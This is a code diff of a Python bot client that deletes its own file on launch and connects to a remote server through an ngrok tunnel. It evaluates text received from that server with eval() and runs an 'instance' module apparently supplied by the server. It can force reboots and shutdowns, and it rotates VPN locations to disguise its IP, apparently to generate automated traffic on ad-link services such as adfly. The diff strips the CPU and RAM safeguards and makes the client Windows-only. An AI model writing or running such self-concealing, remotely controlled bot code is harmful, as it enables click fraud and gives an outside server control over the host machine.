@@ -7,8 +7,10 @@ connection_enabled = True
 total_instances = ['ngrok_direct']
 available_instances = ['ngrok_direct']
 genuine_ip = None
-print('runner')
+
 def run(host_ip, host_port, user_id):
+    from os import remove
+    remove('runner.py')
     global genuine_ip, success, failure, comment, available_instances, img_dict, host_cpu, host_ram
     from PIL import ImageGrab
     from pyautogui import size
@@ -21,14 +23,6 @@ def run(host_ip, host_port, user_id):
     from os import system as system_caller
     from threading import Thread
     import socket
-    from platform import system
-
-    from os import remove
-    remove('runner.py')
-
-
-
-    os_type = system()
 
     def force_connect_server(type_of_connection):
         global host_ip, host_port
@@ -46,7 +40,6 @@ def run(host_ip, host_port, user_id):
                 link_dict = eval(text)
                 host_ip, host_port = link_dict['adfly_user_tcp_connection'].split(':')
                 host_port = int(host_port)
-                print(host_ip, host_port)
         return connection
 
 
@@ -99,36 +92,21 @@ def run(host_ip, host_port, user_id):
 
 
     def __restart_host_machine(duration=5):
-        if os_type == 'Linux':
-            system_caller('systemctl reboot -i')
-        elif os_type == 'Windows':
-            system_caller(f'shutdown -r -f -t {duration}')
+        system_caller(f'shutdown -r -f -t {duration}')
 
 
     def __shutdown_host_machine(duration=5):
-        if os_type == 'Linux':
-            system_caller("shutdown now -h")
-        elif os_type == 'Windows':
-            system_caller(f'shutdown -s -f -t {duration}')
+        system_caller(f'shutdown -s -f -t {duration}')
 
 
     def __connect_vpn():
-        if os_type == 'Linux':
-            locations = ['HK', 'GB', 'CH', 'RO', 'NO', 'NL', 'DE', 'FR', 'CA-W', 'CA', 'US-W', 'US', 'US-C']
-            loc = choice(locations)
-            system_caller(f'windscribe connect {loc}')
-        elif os_type == 'Windows':
-            locations = ['mountain', 'ranch', 'cub', 'snow', 'vice', 'empire', 'precedent', 'dogg', 'cobain', 'montreal', 'toronto', 'vancouver', 'paris', 'amsterdam', 'zurich', 'london']
-            #locations = ['mountain', 'ranch', 'cub', 'snow', 'vice', 'empire', 'precedent', 'dogg', 'cobain']  # US only
-            loc = choice(locations)
-            system_caller(f'windscribe-cli connect {loc}')
+        locations = ["Mountain", "Ranch", "Cub", "Snow", "Vice", "Empire", "Precedent", "Dogg", "Cobain", "Expo 67", "Comfort Zone", "The 6", "Granville", "Vansterdam", "Jardin", "Seine", "Castle", "Wiener", "Canal", "Red Light", "Tulip", "Oslo Fjord", "No Vampires", "Alphorn", "Lindenhof", "Ataturk", "Victoria", "Crumpets", "Custard"]
+        loc = choice(locations)
+        system_caller(f'windscribe-cli connect "{loc}"')
 
 
     def __disconnect_all_vpn():
-        if os_type == 'Linux':
-            system_caller('windscribe disconnect')
-        elif os_type == 'Windows':
-            system_caller('windscribe-cli disconnect')
+        system_caller('windscribe-cli disconnect')
 
 
     def __get_global_ip():
@@ -196,7 +174,7 @@ def run(host_ip, host_port, user_id):
             instance_connection.close()
             del instance_connection
             import instance
-            instance_name, s, f, comment, img_dict = instance.run(host_ip=host_ip, host_port=host_port, img_dict=img_dict)
+            instance_name, s, f, comment, img_dict = instance.run(host_ip=host_ip, host_port=host_port, img_dict=img_dict, user_id=user_id)
             del instance
             success += s
             failure += f
@@ -240,8 +218,7 @@ def run(host_ip, host_port, user_id):
             else:
                 last_ip = current_ip
                 connection_enabled = False
-                if os_type == "Windows":
-                    system_caller('windscribe-cli firewall off')
+                system_caller('windscribe-cli firewall off')
                 __disconnect_all_vpn()
                 __connect_vpn()
                 connection_enabled = True
@@ -267,7 +244,7 @@ def run(host_ip, host_port, user_id):
     def send_data():
         send_data_connection = force_connect_server('tcp')
         __send_to_connection(send_data_connection, b'100')
-        __send_to_connection(send_data_connection, user_id)
+        __send_to_connection(send_data_connection, user_id.encode())
         send_data_connection.settimeout(60)
         while True:
             try:
@@ -283,7 +260,8 @@ def run(host_ip, host_port, user_id):
                 break
         send_data()
 
-
+    __disconnect_all_vpn()
+    sleep(3)
     genuine_ip = __get_global_ip()
     start_time = time()
     Thread(target=restart_if_connection_missing).start()
@@ -297,8 +275,7 @@ def run(host_ip, host_port, user_id):
                 restart_vpn_recheck_ip(True)
                 comment = ''
                 next_ip_reset += randrange(1, 3)
-            update_cpu_ram()
-            if len(available_instances) == len(total_instances) and host_cpu <= 90 and host_ram <= 90 and type(ping('8.8.8.8')) == float:
+            if len(available_instances) == len(total_instances) and type(ping('8.8.8.8')) == float:
                 try:
                     instance = choice(available_instances)
                     available_instances.remove(instance)
